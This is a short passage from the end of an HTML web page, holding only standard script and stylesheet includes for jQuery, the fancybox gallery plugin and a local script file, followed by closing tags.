</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">

  
<script src="../../../../fancybox/jquery.fancybox.pack.js"></script>




<script src="../../../../js/script.js"></script>




  </div>
</body>
</html>